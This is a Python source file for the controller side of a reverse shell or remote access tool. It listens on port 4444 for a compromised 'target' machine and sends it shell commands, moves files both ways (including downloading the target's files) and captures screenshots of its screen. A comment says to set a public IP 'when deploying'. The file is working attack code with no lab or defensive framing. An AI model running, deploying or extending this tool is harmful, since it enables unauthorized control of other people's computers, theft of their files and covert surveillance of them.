import os
import socket
from termcolor import colored
import json

def data_recv():
    data = ''
    while True:
        try:
            data = target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file):
    with open(file, 'rb') as f:
        target.send(f.read())

def download_file(file):   
    with open(file, 'wb') as f:
        target.settimeout(5)
        while True:
            try:
                chunk = target.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
            except socket.timeout:
                break
        target.settimeout(None)

def data_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def t_commun():
    count = 0
    while True:
        comm = input('* shell~%s:' % str(ip))
        data_send(comm)
        
        if comm == 'exit':
            break
        elif comm == 'clear':
            os.system('clear')
        elif comm[:3] == 'cd ':
            pass
        elif comm[:6] == 'upload':
            upload_file(comm[7:])
        elif comm[:8] == 'download':    
            download_file(comm[9:])
        elif comm[:10] == 'screenshot':
            with open(f'screenshot{count}', 'wb') as f:
                target.settimeout(5) 
                while True:
                    try:
                        chunk = target.recv(1024)
                        if not chunk:
                            break
                        f.write(chunk)
                    except socket.timeout:
                        break
                target.settimeout(None)
            count += 1   
        elif comm == 'help':
            print(colored('''\n
            exit: close the session on the target machine.
            clear: clean the screen from the terminal.
            cd + "directoryname": change the directory on the target machine. cd ../../
            upload + "filename": send a file to the target machine.
            download: "filename": download a file from the target machine.
            screenshot: takes a screenshot from target machine.
            help: help the user to use the commands.
            ''', 'green'))
        else:
            answer = data_recv()
            print(answer)              

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', 4444))  # Change IP to your public IP when deploying
print(colored('[-] waiting for connections', 'green'))
sock.listen(5)

target, ip = sock.accept()
print(colored('+ connected with:' + str(ip), 'green'))
t_commun()
